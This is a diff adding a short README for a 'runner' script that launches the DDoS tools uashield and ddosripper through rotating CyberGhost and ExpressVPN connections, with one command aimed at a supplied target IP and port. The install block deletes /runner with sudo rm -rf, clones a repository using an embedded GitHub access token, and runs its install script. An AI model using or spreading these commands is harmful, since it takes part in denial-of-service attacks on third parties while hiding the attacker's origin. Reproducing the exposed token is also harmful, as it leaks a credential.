@@ -1,0 +1,22 @@
+# WTF
+Script thay runs load under vpn and refreshes vpn every 300 seconds
+
+# Install
+```
+cd / && sudo rm -rf runner && \
+sudo git clone https://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@github.com/ctukraine22/runner && \
+cd /runner && bash install.sh
+```
+# Run
+To use cyberhost you need for repo and replace key and crt: https://github.com/qdm12/gluetun/wiki/Cyberghost
+run uashield on cyberhost
+```
+cd /runner && . ./runner.sh && init 0 0 %user% %pass% cyberghost "Russian Federation" 97-1-ru.cg-dialup.net tcp && uashield
+```
+run uashield on expressvpn
+```
+cd /runner && . ./runner.sh && init 0 0 %user% %pass% expressvpn Kyrgyzstan kyrgyzstan-ca-version-2.expressnetw.com && uashield
+```
+run ddosripper for %ip% %port% on expressvpn
+cd /runner && . ./runner.sh && init %ip% %port% %user% %pass% expressvpn Kazakhstan && ddosripper
+
